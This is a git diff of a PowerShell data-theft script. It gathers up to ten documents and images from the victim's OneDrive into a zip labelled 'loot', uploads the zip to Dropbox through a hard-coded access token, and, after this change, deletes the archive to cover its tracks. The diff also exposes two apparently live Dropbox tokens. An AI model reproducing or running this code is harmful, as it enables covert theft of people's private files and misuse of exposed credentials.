@@ -4,7 +4,7 @@ function Upload-DropBox() {
         [Parameter(ValueFromPipeline=$True)]
         [string]$SourceFilePath
     ) 
-    $dropBoxAccessToken = "sl.BndjhI1J8dD94azGoN0Cetj7ve9ZXxkSoAe7MPEaFqIsAucWKpJTaJ0evsYEoUB7wyNYEINiJjsNlj_a5vDgbTkfzu1flu4YJgQH8IKHQAfK9tJ-OPxOnFmTo5WJnAnSm34b1vHoA7wByfA"   # Replace with your DropBox Access Token
+    $dropBoxAccessToken = "sl.BncSjV5TnWvZSpXMdWvXkBDo31itBLe1bi3j_2Pv1nJ-gaO6cOYykmYtSgot4fJiQt3pXkKU446JxEOJ7tc4d067QHaQM-7CewjulXhrYCHqOo5oeE1CXq_ntydyAUg1Be2CN4Pg82d57O4"   # Replace with your DropBox Access Token
     $outputFile = Split-Path $SourceFilePath -leaf
     $targetFilePath = "/$outputFile"
     $arg = '{ "path": "' + $targetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
@@ -20,10 +20,10 @@ $computerName = $env:COMPUTERNAME
 
 if (Test-Path $env:OneDrive) {
     $getLoot = Get-ChildItem -Path $env:OneDrive -Recurse -Include *.docx,*.pptx,*.jpg | Select-Object -First 10
-    $getLoot | Compress-Archive -DestinationPath "$env:TEMP\imabdk-loot-$computerName.zip" -Update -ErrorAction SilentlyContinue
+    $getLoot | Compress-Archive -DestinationPath "$env:TEMP\imabdk-loot-$computerName.zip" -Update
 }
 
 if (Test-Path "$env:TEMP\imabdk-loot-$computerName.zip") {
     Upload-DropBox -SourceFilePath "$env:TEMP\imabdk-loot-$computerName.zip"
-    #Remove-Item -Path "$env:TEMP\imabdk-loot-$computerName.zip" -Force
+    Remove-Item -Path "$env:TEMP\imabdk-loot-$computerName.zip" -Force
 }
